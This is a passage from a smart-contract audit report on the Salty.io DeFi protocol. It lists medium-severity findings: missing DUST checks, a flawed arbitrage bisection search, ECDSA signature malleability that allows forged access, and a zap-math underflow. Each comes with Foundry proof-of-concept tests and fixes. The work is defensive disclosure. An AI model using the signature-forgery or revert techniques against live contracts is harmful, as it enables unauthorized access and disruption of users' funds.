| rewardPercentForCallingLiquidation | minimumCollateralRatioPercent | **_Actual_** price fluctuation upper limit (instead of the expected 105%) | 
|:--------:|:--------:|:------:|
| 5 | 110 | 104.5  |
| 6 | 111 | 104.34 |
| 7 | 112 | 104.16 |
| 8 | 113 | 103.96 |
| 9 | 114 | 103.74 |
|10 | 115 | 103.5  |

<br>

Desired figures for maintaining an upper limit of `>= 105%` of borrowed amount:
| rewardPercentForCallingLiquidation | **_Desired_** minimumCollateralRatioPercent | **_Resultant_** price fluctuation upper limit | 
|:--------:|:--------:|:------:|
| 5 | 111 | 105.45 |
| 6 | 112 | 105.28 |
| 7 | 113 | 105.09 |
| 8 | 115 | 105.8  |
| 9 | 116 | 105.56 |
|10 | 117 | 105.3  |


## Tools used
Manual review

## Recommended Mitigation Steps
Assuming that the protocol wants to calculate an actual 105% `remainingRatio`, changes along these lines need to be made. Please note that you may have to additionally make sure rounding errors & precision loss do not creep in. These suggestions point towards a general direction:<br>
Update the two functions:
```diff
	function changeRewardPercentForCallingLiquidation(bool increase) external onlyOwner
        {
        if (increase)
            {
			// Don't increase rewardPercentForCallingLiquidation if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
+           uint256 afterIncrease = rewardPercentForCallingLiquidation + 1;
+           uint256 remainingRatio = minimumCollateralRatioPercent - minimumCollateralRatioPercent * afterIncrease / 100;
-			uint256 remainingRatioAfterReward = minimumCollateralRatioPercent - rewardPercentForCallingLiquidation - 1;

-           if (remainingRatioAfterReward >= 105 && rewardPercentForCallingLiquidation < 10)
+           if (remainingRatio >= 105 && rewardPercentForCallingLiquidation < 10)
                rewardPercentForCallingLiquidation += 1;
            }
        else
            {
            if (rewardPercentForCallingLiquidation > 5)
                rewardPercentForCallingLiquidation -= 1;
            }

		emit RewardPercentForCallingLiquidationChanged(rewardPercentForCallingLiquidation);
        }
```

and

```diff
	function changeMinimumCollateralRatioPercent(bool increase) external onlyOwner
        {
        if (increase)
            {
            if (minimumCollateralRatioPercent < 120)
                minimumCollateralRatioPercent += 1;
            }
        else
            {
			// Don't decrease the minimumCollateralRatioPercent if the remainingRatio after the rewards would be less than 105% - to ensure that the position will be liquidatable for more than the originally borrowed USDS amount (assume reasonable market volatility)
+           uint256 afterDecrease = minimumCollateralRatioPercent - 1;
+           uint256 remainingRatio = afterDecrease - afterDecrease * rewardPercentForCallingLiquidation / 100;            
-			uint256 remainingRatioAfterReward = minimumCollateralRatioPercent - 1 - rewardPercentForCallingLiquidation;

-           if (remainingRatioAfterReward >= 105 && minimumCollateralRatioPercent > 110)
+           if (remainingRatio >= 105 && minimumCollateralRatioPercent > 111)
                minimumCollateralRatioPercent -= 1;
            }

		emit MinimumCollateralRatioPercentChanged(minimumCollateralRatioPercent);
        }
```

Also [L39](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/StableConfig.sol#L39):
```diff
- 39:     uint256 public minimumCollateralRatioPercent = 110;
+ 39:     uint256 public minimumCollateralRatioPercent = 111;
```

---

### <a id="m-08"></a>[M-08]
## **Missing DUST check in depositSwapWithdraw() and depositDoubleSwapWithdraw()**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L207
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L222
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L382
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L395
<br>

## Impact
[swap()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L366) requires that the user deposits the `swapAmountIn` prior to its call. User can make use of [deposit()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L207) and [withdraw()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L222) for this which has constraints on the DUST amount:
```js
	function deposit( IERC20 token, uint256 amount ) external nonReentrant
		{
@--->   require( amount > PoolUtils.DUST, "Deposit amount too small");

		_userDeposits[msg.sender][token] += amount;

		// Transfer the tokens from the sender - only tokens without fees should be whitelsited on the DEX
		token.safeTransferFrom(msg.sender, address(this), amount );

		emit TokenDeposit(msg.sender, token, amount);
		}
```

```js
    function withdraw( IERC20 token, uint256 amount ) external nonReentrant
    	{
    	require( _userDeposits[msg.sender][token] >= amount, "Insufficient balance to withdraw specified amount" );
@--->   require( amount > PoolUtils.DUST, "Withdraw amount too small");

		_userDeposits[msg.sender][token] -= amount;

    	// Send the token to the user
    	token.safeTransfer( msg.sender, amount );

    	emit TokenWithdrawal(msg.sender, token, amount);
    	}
```

The protocol also provides two similar functions [depositSwapWithdraw()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L382) and [depositDoubleSwapWithdraw()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/Pools.sol#L395) which include the token transfer calls within them. However, no DUST threshold check is made inside them and hence user can always choose to call these two functions to bypass the checks.

## Proof of Concept
The two functions missing the DUST check:
```js
	// Deposit tokenIn, swap to tokenOut and then have tokenOut sent to the sender
	function depositSwapWithdraw(IERC20 swapTokenIn, IERC20 swapTokenOut, uint256 swapAmountIn, uint256 minAmountOut, uint256 deadline ) external nonReentrant ensureNotExpired(deadline) returns (uint256 swapAmountOut)
		{
		// Transfer the tokens from the sender - only tokens without fees should be whitelisted on the DEX
		swapTokenIn.safeTransferFrom(msg.sender, address(this), swapAmountIn );

		swapAmountOut = _adjustReservesForSwapAndAttemptArbitrage(swapTokenIn, swapTokenOut, swapAmountIn, minAmountOut );

    	// Send tokenOut to the user
    	swapTokenOut.safeTransfer( msg.sender, swapAmountOut );
		}


	// A convenience method to perform two swaps in one transaction
	function depositDoubleSwapWithdraw( IERC20 swapTokenIn, IERC20 swapTokenMiddle, IERC20 swapTokenOut, uint256 swapAmountIn, uint256 minAmountOut, uint256 deadline ) external nonReentrant ensureNotExpired(deadline) returns (uint256 swapAmountOut)
		{
		swapTokenIn.safeTransferFrom(msg.sender, address(this), swapAmountIn );

		uint256 middleAmountOut = _adjustReservesForSwapAndAttemptArbitrage(swapTokenIn, swapTokenMiddle, swapAmountIn, 0 );
		swapAmountOut = _adjustReservesForSwapAndAttemptArbitrage(swapTokenMiddle, swapTokenOut, middleAmountOut, minAmountOut );

    	swapTokenOut.safeTransfer( msg.sender, swapAmountOut );
		}
```

## Tools used
Manual inspection

## Recommended Mitigation Steps
```diff
	// Deposit tokenIn, swap to tokenOut and then have tokenOut sent to the sender
	function depositSwapWithdraw(IERC20 swapTokenIn, IERC20 swapTokenOut, uint256 swapAmountIn, uint256 minAmountOut, uint256 deadline ) external nonReentrant ensureNotExpired(deadline) returns (uint256 swapAmountOut)
		{
+       require( swapAmountIn > PoolUtils.DUST, "Deposit amount too small");
		// Transfer the tokens from the sender - only tokens without fees should be whitelisted on the DEX
		swapTokenIn.safeTransferFrom(msg.sender, address(this), swapAmountIn );

		swapAmountOut = _adjustReservesForSwapAndAttemptArbitrage(swapTokenIn, swapTokenOut, swapAmountIn, minAmountOut );

    	// Send tokenOut to the user
+       require( swapAmountOut > PoolUtils.DUST, "Withdraw amount too small");
    	swapTokenOut.safeTransfer( msg.sender, swapAmountOut );
		}


	// A convenience method to perform two swaps in one transaction
	function depositDoubleSwapWithdraw( IERC20 swapTokenIn, IERC20 swapTokenMiddle, IERC20 swapTokenOut, uint256 swapAmountIn, uint256 minAmountOut, uint256 deadline ) external nonReentrant ensureNotExpired(deadline) returns (uint256 swapAmountOut)
		{
+       require( swapAmountIn > PoolUtils.DUST, "Deposit amount too small");
		swapTokenIn.safeTransferFrom(msg.sender, address(this), swapAmountIn );

		uint256 middleAmountOut = _adjustReservesForSwapAndAttemptArbitrage(swapTokenIn, swapTokenMiddle, swapAmountIn, 0 );
		swapAmountOut = _adjustReservesForSwapAndAttemptArbitrage(swapTokenMiddle, swapTokenOut, middleAmountOut, minAmountOut );

+       require( swapAmountOut > PoolUtils.DUST, "Withdraw amount too small");
    	swapTokenOut.safeTransfer( msg.sender, swapAmountOut );
		}
```

---

### <a id="m-09"></a>[M-09]
## **Loss of arbitrage profit due to premature check applied in bisection search**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/arbitrage/ArbitrageSearch.sol#L74-L76
<br>

## Impact
The `_bisectionSearch()` algorithm tries finding the profitable arbitrage point inside the search space by repeating the process 8 times using the loop [here on L115](https://github.com/code-423n4/2024-01-salty/blob/main/src/arbitrage/ArbitrageSearch.sol#L114-L124):
```js
			// Cost is about 492 gas per loop iteration
			for( uint256 i = 0; i < 8; i++ )
				{
				uint256 midpoint = (leftPoint + rightPoint) >> 1;

				// Right of midpoint is more profitable?
				if ( _rightMoreProfitable( midpoint, reservesA0, reservesA1, reservesB0, reservesB1, reservesC0, reservesC1 ) )
					leftPoint = midpoint;
				else
					rightPoint = midpoint;
				}
```

Here, the [_rightMoreProfitable()](https://github.com/code-423n4/2024-01-salty/blob/main/src/arbitrage/ArbitrageSearch.sol#L74-L76) function receives the `midpoint` as an argument and proceeds to calculate the `profitMidpoint`. It then checks if this is less than DUST amount and returns `false` in that case:
```js
	// Given the reserves for the arbitrage swap, determine if right of the midpoint looks to be more profitable than the midpoint itself.
	// Used as a substitution for the overly complex derivative in order to determine which direction the optimal arbitrage amountIn is more likely to be.
	function _rightMoreProfitable( uint256 midpoint, uint256 reservesA0, uint256 reservesA1, uint256 reservesB0, uint256 reservesB1, uint256 reservesC0, uint256 reservesC1 ) internal pure returns (bool rightMoreProfitable)
		{
		unchecked
			{
			// Calculate the AMM output of the midpoint
			uint256 amountOut = (reservesA1 * midpoint) / (reservesA0 + midpoint);
			amountOut = (reservesB1 * amountOut) / (reservesB0 + amountOut);
			amountOut = (reservesC1 * amountOut) / (reservesC0 + amountOut);

			int256 profitMidpoint = int256(amountOut) - int256(midpoint);

			// If the midpoint isn't profitable then we can remove the right half the range as nothing there will be profitable there either.
@------->	if ( profitMidpoint < int256(PoolUtils.DUST) )
				return false;


			// Calculate the AMM output of a point just to the right of the midpoint
			midpoint += MIDPOINT_PRECISION;

			amountOut = (reservesA1 * midpoint) / (reservesA0 + midpoint);
			amountOut = (reservesB1 * amountOut) / (reservesB0 + amountOut);
			amountOut = (reservesC1 * amountOut) / (reservesC0 + amountOut);

			int256 profitRightOfMidpoint = int256(amountOut) - int256(midpoint);

			return profitRightOfMidpoint > profitMidpoint;
			}
		}
```

The comment on L74 mentions that:
```js
    // If the midpoint isn't profitable then we can remove the right half the range as nothing there will be profitable there either.
```

This is not true and our objective is to show that:
- The **_entire family_** of profit function curve values where the first greater-than-dust value occurs to the right of the initial `midpoint` (blue dotted vertical line) is ignored by the current logic and `bestArbAmountIn` is returned as zero, even though there exists a valid arbitrage opportunity on the curve. _(See example #3 later)_
- **Even if the starting position of the midpoint is at a comfortable position** inside the curve, while doing the search the search space can move towards the left transforming it into a configuration as above _(See example #5 later)_. The alogrithm has no way of recovering and re-considering the right search space again. Hence, it will miss the profit peak and return zero.
- Lastly, we also additionally observe that if the midpoint is too far off to the right, even after 8 halvings (i.e. division by $2^8 = 256$) it does not intersect the profit curve due to which a value of zero is returned _(See example #4 later)_.

While the coded PoC has been supplied in a later section, we'll first try to visualize the problematic configurations by extracting out the core logic of the current implementation and playing around with different swapInAmounts.
<br><br>

Here is the [Desmos graph calculator](https://www.desmos.com/calculator/vmb4jjqgmx) which simulates an example profit curve. Legend & variables used:
- The first slider $var_{swapAmountInETH}$ can be used to change values
- The left & right orange lines are the left and right limits of the search space: `1/128` of $var_{swapAmountInETH}$ and `125%` of $var_{swapAmountInETH}$ respectively
- The dotted blue vertical line is the `midpoint`
- The dashed horizontal red line is the DUST threshold, kept as 10 in these examples for easy calculation
- The green curve is the arbitrage profit curve with the peak at $var_{swapAmountInETH} = 40$ (or `midpoint` of `26.375`), yielding a profit of `32`.

We will abstract away the core logic of the [_bisectionSearch()](https://github.com/code-423n4/2024-01-salty/blob/main/src/arbitrage/ArbitrageSearch.sol#L101) into a python program so that it's easier to work with decimals and simulate the behaviour represented in the Desmos graph. Here is the [code in an online compiler](https://onecompiler.com/python/422ysu9mm). At the end of the code, one can change the arguments and call `print(_bisectionSearch(118))` to see the returned value for a given `swapAmountInETH`. The output is expected to always be approximately equal to `26.375`. An output of `0` means no peak i.e. no arbitrage opportunity was found by the protocol.
<br>

This is the abstracted python code version of `ArbitrageSearch.sol` we will be using:
```python
MIDPOINT_PRECISION = 0.001
DUST = 10

# Desmos curve equation which returns the arbitrage profit at any midpoint value
def _getProfitAtPoint(point):
  return (-0.046 * (point-26.375)**2 + 32)
  
  
def _rightMoreProfitable(midpoint):
  profitMidpoint = _getProfitAtPoint(midpoint)
  if (profitMidpoint < DUST):
    return False
  
  profitRightOfMidpoint = _getProfitAtPoint(midpoint + MIDPOINT_PRECISION)
  
  return profitRightOfMidpoint > profitMidpoint
  
  
def _bisectionSearch(swapAmountInValueInETH):
  leftPoint = swapAmountInValueInETH / 128
  rightPoint = swapAmountInValueInETH + (swapAmountInValueInETH / 4)
  
  for i in range(8):
    midpoint = (leftPoint + rightPoint) / 2
    if _rightMoreProfitable(midpoint):
      leftPoint = midpoint
    else:
      rightPoint = midpoint
      
  bestArbAmountIn = (leftPoint + rightPoint) / 2
  
  if (_getProfitAtPoint(bestArbAmountIn) < DUST):
    return 0
    
  return bestArbAmountIn
  
  
# test for any `swapAmountInValueInETH`
print(_bisectionSearch(40))
print(_bisectionSearch(50))
print(_bisectionSearch(5))
print(_bisectionSearch(9900))
```

Output:
```text
26.4178466796875
26.471710205078125
0
0
```

## Proof of Concept
Move the slider for $var_{swapAmountInETH}$ on the [Desmos calculator](https://www.desmos.com/calculator/vmb4jjqgmx) to match the values under column `swapAmountInETH` of the following **Table of Examples**:
| Example# | swapAmountInETH | Returned value (approximated) | Explanation/Root Cause |
|:--------:|:--------:|:------:|-----------------|
| 1 | 40 | 26.4 | Works as expected. |
| 2 | 50 | 26.4 | Works as expected. |
| 3 | 5  | 0  | The blue vertical line (`midpoint`) and the green curve intersect to give us the profit of `7.176` at the `midpoint = 3.14453125`. Since this profit is `< DUST`, the function `_rightMoreProfitable()` returns `false` and the search space moves to the left of the blue line. Since there is no peak in that space, eventually `0` is returned. |
| 4 | 9900  | 0  | The midpoint is so far away to the right that even after 8 halvings (i.e. division by $2^8 = 256$) it does not enter the green-curve space. Hence, zero is returned. |
| 5 | 50, but with DUST = 30 | will return 0 | This is problematic in a slightly different manner. The blue line is to the right of the peak value. The midpoint `31.4453125` intersects with the curve to give a profit of `30.817`. Since the curve goes down towards the right from here (i.e. profit at `midpoint + 0.01` is lesser), the search space is once again shifted to the left after `false` is returned on [L88](https://github.com/code-423n4/2024-01-salty/blob/main/src/arbitrage/ArbitrageSearch.sol#L88). The new `midPoint` is calculated as `(0.390625 + 31.4453125) / 2 = 15.91796875`. Move the slider to `25` to approximately view this new midpoint. It intersects with the profit curve at `26.78`. If we assume that the protocol's DUST threshold was set to 30, then the algo returns `false` here on [L76](https://github.com/code-423n4/2024-01-salty/blob/main/src/arbitrage/ArbitrageSearch.sol#L76) and we shift further to the left. The peak is never discovered. Note that we have made the supposition of DUST = 30 simply to show the example with the same Desmos curve. You could choose to design a new profit curve equation which demonstrates the same behaviour with lower DUST value. The fundamental process remains the same. |

## Coded POC
Add the following tests inside `src/scenario_tests/Comprehensive1.t.sol` and run via `COVERAGE="yes" NETWORK="sep" forge test -vv --rpc-url https://rpc.ankr.com/eth_sepolia --mt test_ArbExample_` to run both the tests which reproduce the behaviour of Examples# 3 and 4. 
```js
	function arbTestsSetup() internal {
		// set the token prices for easy calculation
		vm.startPrank( DEPLOYER );
		forcedPriceFeed.setBTCPrice(1 ether);
		forcedPriceFeed.setETHPrice(1 ether);
		vm.stopPrank();

		// Cast votes for the BootstrapBallot so that the initialDistribution can happen
		bytes memory sig = abi.encodePacked(aliceVotingSignature);
		vm.startPrank(alice);
		bootstrapBallot.vote(true, sig);
		vm.stopPrank();

		sig = abi.encodePacked(bobVotingSignature);
		vm.startPrank(bob);
		bootstrapBallot.vote(true, sig);
		vm.stopPrank();

		// Finalize the ballot to distribute SALT to the protocol contracts and start up the exchange
		vm.warp( bootstrapBallot.completionTimestamp() );
		bootstrapBallot.finalizeBallot();

		deal(address(salt), address(alice), 1e36);
		deal(address(wbtc), address(alice), 1e36);
		deal(address(weth), address(alice), 1e36);
		deal(address(weth), address(bob), 	1e36);

		// No liquidity exists yet
		// Alice adds some SALT/WETH, AND SALT/WBTC
		vm.startPrank(alice);
		salt.approve(address(collateralAndLiquidity), type(uint256).max);
		weth.approve(address(collateralAndLiquidity), type(uint256).max);
		wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
		vm.stopPrank();
	}

	// helper function to calculate the actual profit for for a given point using AMM formula
	function helper_realProfitAtPoint(uint256 swapInQty, uint256 swapPoint, uint256 reserve_weth_pool_1, uint256 reserve_salt_pool_1, uint256 reserve_salt_pool_2, uint256 reserve_wbtc_pool_2, uint256 reserve_wbtc_pool_3, uint256 reserve_weth_pool_3) internal pure returns (uint256) {
		uint swapAmountOut = (swapPoint * 1e18 * reserve_salt_pool_2 * 1e18) / (swapPoint * 1e18 + reserve_wbtc_pool_2 * 1e18);
		uint rsalt2 = reserve_salt_pool_2 * 1e18 - swapAmountOut;
		uint rwbtc2 = reserve_wbtc_pool_2 * 1e18 + swapPoint * 1e18;
		uint out1 = (swapInQty * reserve_salt_pool_1 * 1e18) / (swapInQty + reserve_weth_pool_1 * 1e18);
		uint out2 = (out1  * rwbtc2) / (out1 + rsalt2);
		uint out3 = (out2  * reserve_weth_pool_3 * 1e18) / (out2 + reserve_wbtc_pool_3 * 1e18);
		if (out3 > swapInQty)
			return out3 - swapInQty;
		else
			return 0;
	}

	// reproduces example #3 from the 'table of examples'
	function test_ArbExample_3() public
	{
		arbTestsSetup();

		uint256 reserve_weth_pool_1 = 0.028 ether;
		uint256 reserve_salt_pool_1 = 0.01 ether;
		uint256 reserve_salt_pool_2 = reserve_salt_pool_1;
		uint256 reserve_wbtc_pool_2 = 0.01 ether;
		uint256 reserve_wbtc_pool_3 = reserve_wbtc_pool_2;
		uint256 reserve_weth_pool_3 = reserve_weth_pool_1;

		// Alice adds liquidity
		vm.startPrank(alice);
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(weth, salt,  reserve_weth_pool_1 * 10**18, reserve_salt_pool_1 * 10**18, 0, block.timestamp, false);
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, wbtc,  reserve_salt_pool_2 * 10**18, reserve_wbtc_pool_2 * 10**8, 0, block.timestamp, false);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(reserve_wbtc_pool_3 * 10**8, reserve_weth_pool_3 * 10**18, 0, block.timestamp, false);
		vm.stopPrank();

		// Bob swaps
		vm.startPrank(bob);
		salt.approve(address(collateralAndLiquidity), type(uint256).max);
		uint swapPoint = 33;
		uint swapAmountIn = swapPoint * 10**8;
		pools.depositSwapWithdraw(wbtc, salt, swapAmountIn, 0, block.timestamp);
		console.log("\ntest_ArbExample_3:");
		// @audit : 0 
		console.log( "Protocol calculated ARBITRAGE PROFITS: (weth)", pools.depositedUserBalance( address(dao), weth ) );
		// @audit : 58560
		console.log( "AMM formula calculated real profit at point 10.748437 =", helper_realProfitAtPoint(10.748437 ether, swapPoint, reserve_weth_pool_1, reserve_salt_pool_1, reserve_salt_pool_2, reserve_wbtc_pool_2, reserve_wbtc_pool_3, reserve_weth_pool_3));
	}

	// reproduces example #4 from the 'table of examples'
	function test_ArbExample_4() public
	{
		arbTestsSetup();

		uint256 reserve_weth_pool_1 = 10;
		uint256 reserve_salt_pool_1 = 10;
		uint256 reserve_salt_pool_2 = reserve_salt_pool_1;
		uint256 reserve_wbtc_pool_2 = 10;
		uint256 reserve_wbtc_pool_3 = reserve_wbtc_pool_2;
		uint256 reserve_weth_pool_3 = reserve_weth_pool_1;

		// Alice adds liquidity
		vm.startPrank(alice);
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(weth, salt,  reserve_weth_pool_1 * 10**18, reserve_salt_pool_1 * 10**18, 0, block.timestamp, false);
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, wbtc,  reserve_salt_pool_2 * 10**18, reserve_wbtc_pool_2 * 10**8, 0, block.timestamp, false);
		collateralAndLiquidity.depositCollateralAndIncreaseShare(reserve_wbtc_pool_3 * 10**8, reserve_weth_pool_3 * 10**18, 0, block.timestamp, false);
		vm.stopPrank();

		// Bob swaps
		vm.startPrank(bob);
		salt.approve(address(collateralAndLiquidity), type(uint256).max);
		uint swapPoint = 990;
		uint swapAmountIn = swapPoint * 10**8;
		pools.depositSwapWithdraw(wbtc, salt, swapAmountIn, 0, block.timestamp);
		console.log("\ntest_ArbExample_4:");
		// @audit : 0 ether
		console.log( "Protocol calculated ARBITRAGE PROFITS: (weth)", pools.depositedUserBalance( address(dao), weth ) );
		// @audit : 2.164 ether
		console.log( "AMM formula calculated real profit at point 7.734 =", helper_realProfitAtPoint(7.734 ether, swapPoint, reserve_weth_pool_1, reserve_salt_pool_1, reserve_salt_pool_2, reserve_wbtc_pool_2, reserve_wbtc_pool_3, reserve_weth_pool_3));
	}
```

Output:
```text
[PASS] test_ArbExample_3() (gas: 2005727)
Logs:
  
test_ArbExample_3:
  Protocol calculated ARBITRAGE PROFITS: (weth) 0
  AMM formula calculated real profit at point 10.748437 = 58560

[PASS] test_ArbExample_4() (gas: 2005762)
Logs:
  
test_ArbExample_4:
  Protocol calculated ARBITRAGE PROFITS: (weth) 0
  AMM formula calculated real profit at point 7.734 = 2164742798229448455
```

## Tools used
Foundry and manual inspection.

## Recommended Mitigation Steps
We would have to rethink the current logic. One way to handle this could be -
- Proceed as usual, but save the initial/first `midpoint` value in memory as `savedMidpoint`. We'll use this later.
- If no peak is eventually returned by the algorithm, then consider the new search space to be such that `leftPoint = savedMidpoint` and `rightPoint = 125% of swapAmountInValueInETH`.
- Redo the search.

The above approach is admittedly more expensive.
<br>

It would perhaps be better to implement a different search algorithm altogether more suited for the job.

---

### <a id="m-10"></a>[M-10]
## **Incomplete implementation of _verifySignature() allows forged access**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/SigningTools.sol#L11
<br>

## Impact
[_verifySignature()](https://github.com/code-423n4/2024-01-salty/blob/main/src/SigningTools.sol#L10-L29) is implemented almost in an identical manner to OpenZeppelin's [ECDSA.sol::tryRecover()](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L56-L73) with one critical difference which makes the current implementation open to an attack vector involving malleable (non-unique) signatures:
<br>

[Salty.io implementation](https://github.com/code-423n4/2024-01-salty/blob/main/src/SigningTools.sol#L10-L29):
```js
	// Verify that the messageHash was signed by the authoratative signer.
    function _verifySignature(bytes32 messageHash, bytes memory signature ) internal pure returns (bool)
    	{
    	require( signature.length == 65, "Invalid signature length" );

		bytes32 r;
		bytes32 s;
		uint8 v;

		assembly
			{
			r := mload (add (signature, 0x20))
			s := mload (add (signature, 0x40))
			v := mload (add (signature, 0x41))
			}

@----->	address recoveredAddress = ecrecover(messageHash, v, r, s);  // @audit : vulnerability

        return (recoveredAddress == EXPECTED_SIGNER);
    	}
```

[OZ implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L56-L73):
```js
    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverError, bytes32) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            // ecrecover takes the signature parameters, and the only way to get them
            // currently is to use assembly.
            /// @solidity memory-safe-assembly
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
@----->	    return tryRecover(hash, v, r, s);
        } else {
            return (address(0), RecoverError.InvalidSignatureLength, bytes32(signature.length));
        }
    }
```

OZ calls `tryRecover()` instead of directly calling `erecover()`. OZ's [tryRecover()](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L122-L148) makes sure that `s` is not greater than `0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0`. This is necessary [because](https://scsfg.io/hackers/signature-attacks/#signature-malleability):
```text
Signature malleability is a characteristic of digital signatures. In Ethereum, an ECDSA signature is represented by two 32-byte sized, r and s values, and a one-byte recovery value, v. The symmetric structure of elliptic curves implies that no signature is unique. A consequence of these "malleable" signatures is that they can be altered without being invalidated.

For every set of parameters {r, s, v} used to create a signature, another distinct set {r', s', v'} results in an equivalent signature. Therefore, when a smart contract system uses ecrecover directly instead of a well-known library like OpenZeppelin's ECDSA, detecting and discarding malleable signatures is essential.

OpenZeppelin's ECDSA library contains the following code to prevent forged signatures:

1:          if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
2:              return (address(0), RecoverError.InvalidSignatureS);
3:          }

This measure stops signature malleability attacks since most signatures from current libraries yield a unique signature with an s-value in the lower half order. It is vital to the signature validation library that this check is in place.
```
<br>

`_verifySignature()` is called internally by [grantAccess()](https://github.com/code-423n4/2024-01-salty/blob/main/src/AccessManager.sol#L61) as well as [vote()](https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/BootstrapBallot.sol#L54). An attacker can hence forge a signature and bypass these checks.

## Proof of Concept
https://github.com/code-423n4/2024-01-salty/blob/main/src/SigningTools.sol#L11

## Tools used
Manual inspection

## Recommended Mitigation Steps
- Either add the missing check necessary for `s` (change the assembly code to retrieve `v` too, to make it identical to OZ's) 
- Or use OpenZeppelin's library.



---

### <a id="m-11"></a>[M-11]
## **Incorrect assumption in PoolMath.sol can cause underflow when zapping is used**
#### https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L191-L192
<br>

## Impact
[_zapSwapAmount()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L191-L192) assumes that:
```js
191:		// r1 * z0 guaranteed to be greater than r0 * z1 per the conditional check in _determineZapSwapAmount
192:        uint256 C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
```

The protocol's assumption of `r1 * z0 guaranteed to be greater than r0 * z1` is based on the following check in [_determineZapSwapAmount()](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L214-L220):
```js
214:		// zapAmountA / zapAmountB exceeds the ratio of reserveA / reserveB? - meaning too much zapAmountA
215:		if ( zapAmountA * reserveB > reserveA * zapAmountB )
216:			(swapAmountA, swapAmountB) = (_zapSwapAmount( reserveA, reserveB, zapAmountA, zapAmountB ), 0);
217:
218:		// zapAmountA / zapAmountB is less than the ratio of reserveA / reserveB? - meaning too much zapAmountB
219:		if ( zapAmountA * reserveB < reserveA * zapAmountB )
220:			(swapAmountA, swapAmountB) = (0, _zapSwapAmount( reserveB, reserveA, zapAmountB, zapAmountA ));
```

The assumption would had been true for all cases if not for this piece of logic inside [_zapSwapAmount()#L158-L168](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#L158-L168) which right shifts the arguments if the `maximumMSB` is greater than 80:
```js
    	// Assumes the largest number has more than 80 bits - but if not then shifts zero effectively as a straight assignment.
    	// C will be calculated as: C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
    	// Multiplying three 80 bit numbers will yield 240 bits - within the 256 bit limit.
		if ( maximumMSB > 80 )
			shift = maximumMSB - 80;

    	// Normalize the inputs to 80 bits.
    	uint256 r0 = reserve0 >> shift;
		uint256 r1 = reserve1 >> shift;
		uint256 z0 = zapAmount0 >> shift;
		uint256 z1 = zapAmount1 >> shift;
```

This can lead to `z0` being reduced to `0` and hence causing underflow on [L192](https://github.com/code-423n4/2024-01-salty/blob/main/src/pools/PoolMath.sol#LL192). 
<br>

Since `_determineZapSwapAmount()` is internally called whenever `depositLiquidityAndIncreaseShare()` is called with `useZapping = true`, it will cause a revert when a situation like the following exists:
```js
        uint256 reserveA = 1500000000;
        uint256 reserveB = 2000000000 ether;
        uint256 zapAmountA = 150;
        uint256 zapAmountB = 100 ether;
```

`maximumMSB` in this case is `90` (for `reserveB`) and also an excess of `zapAmountA` is being provided as compared to the existing reserve ratio. Hence, right shift by `90 - 80 = 10` bits will occur resulting `z0` to be `0`.

## Proof of Concept
Create a new file `src/stable/tests/BugPoolMath.t.sol` and add the following code. Run it via `forge test -vv --mt test_poolMath` to see the test revert:
```js
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../pools/PoolMath.sol";
import { console, Test } from "forge-std/Test.sol";

contract BugPoolMath is Test
{
    function test_poolMath() public view {
        uint256 reserveA = 1500000000;
        uint256 reserveB = 2000000000 ether;
        uint256 zapAmountA = 150;
        uint256 zapAmountB = 100 ether;

        (uint256 swapAmountA, uint256 swapAmountB) = PoolMath._determineZapSwapAmount(reserveA, reserveB, zapAmountA, zapAmountB);
        console.log("swapAmountA = %s, swapAmountB = %s", swapAmountA, swapAmountB);
    }
}
```

## Tools used
Foundry

## Recommended Mitigation Steps
Make sure to check the assertion again:
```diff
    function _zapSwapAmount( uint256 reserve0, uint256 reserve1, uint256 zapAmount0, uint256 zapAmount1 ) internal pure returns (uint256 swapAmount)
    	{
    	uint256 maximumMSB = _maximumMSB( reserve0, reserve1, zapAmount0, zapAmount1);

		uint256 shift = 0;

    	// Assumes the largest number has more than 80 bits - but if not then shifts zero effectively as a straight assignment.
    	// C will be calculated as: C = r0 * ( r1 * z0 - r0 * z1 ) / ( r1 + z1 );
    	// Multiplying three 80 bit numbers will yield 240 bits - within the 256 bit limit.
